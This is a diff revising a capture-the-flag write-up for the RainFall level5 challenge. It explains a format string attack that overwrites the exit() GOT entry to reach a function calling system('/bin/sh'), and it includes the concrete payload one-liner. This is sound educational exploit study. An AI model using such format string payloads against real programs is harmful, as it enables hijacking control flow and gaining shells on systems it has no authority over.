@@ -52,21 +52,19 @@ Here, we find 3 interesting functions: `main`, `n` and `o`.
 The `main` function calls `n()` then returns.
 
 
-### n function 
+#### n function 
 
-The `n` function first calls `fgets()` on `stdout` to store the input in a **local variable** `level_20c` with a **size limit** of `0x200` (i.e 512 in hexadecimal).
+The `n` function first calls `fgets()` on `stdout` to store the input in a **local variable** `level_20c` with a **size limit** of `0x200` (512 in decimal).
 
-Then `exit(1)`.
+The function then calls `exit(1)`.
 
-### o function 
+#### o function 
 
-The `o` function calls `system("/bin/sh")`;
+The `o` function calls `system("/bin/sh")`.
 
 And this function isn't called by `main()` or `n()`.
 
 ## 3. Exploit Development
-
-In this level, we can again use the **Format String Attack**. But this not to overwrite a gobal variable but a jump value.
 
 In this level, we can once again use a **Format String Attack**, but this time not to overwrite a global variable. Instead, the goal is to **overwrite a jump target**.
 
@@ -162,7 +160,7 @@ For this attack, the **payload structure** is the same as before:
 ```
 
 Where:
-  - `<memory address to update>` is the **address** where the **indirect jump** redirect.
+  - `<memory address to update>` is the **GOT entry address** that we want to overwrite (the address where the **indirect jump** will redirect).
   - `<padding>` represents the **number of characters** to print.
   - `<%X$n>` **writes** the number of printed characters to the **memory address** located at position `X` on the **stack**.
 
@@ -218,7 +216,7 @@ Which gives:
 Once again, printing this many characters directly would be **too large** and would cause a **broken pipe**.
 To avoid this, we use a **formatted width specifier** (e.g. `%134513824x`).
 
-`%x` **prints** and **pops** the value at the **top of the stack**.  
+`%x` **reads and prints** the value at the current position on the stack, then advances to the next stack argument.
 When a width is specified, `printf` uses it as a **minimum field width**.
 
 It pads the output with spaces **before** the value so that the total number of printed characters **matches** the **specified width**.
@@ -234,6 +232,19 @@ Representing:
 4 (padding spaces) + 8 (printed value) = 12 characters
 ```
 
+### GOT Overwrite visualization
+```
+BEFORE:
+exit@plt → jmp *[0x8049838] → GOT[exit] = 0xb7e5ebe0 (real exit in libc)
+
+__________________________________________________________________________
+
+AFTER:
+exit@plt → jmp *[0x8049838] → GOT[exit] = 0x80484a4 (address of o())
+                                               ↓
+                                         system("/bin/sh")
+```
+
 ### Create the Payload
 
 ```
@@ -245,11 +256,11 @@ Note:
 
 **Explanation:**
 - `python`			: launches the Python interpreter.
-- `-c` 					: executes the command passed as a string.
+- `-c` 				: executes the command passed as a string.
 - `print` 			: outputs data to standard output.
 
 
-## 4. Get The Flag
+## 4. Capture The Flag
 
 ```bash
 level5@RainFall:~$ python -c "print '\x38\x98\x04\x08%134513824x%4\$n'" > /tmp/p5
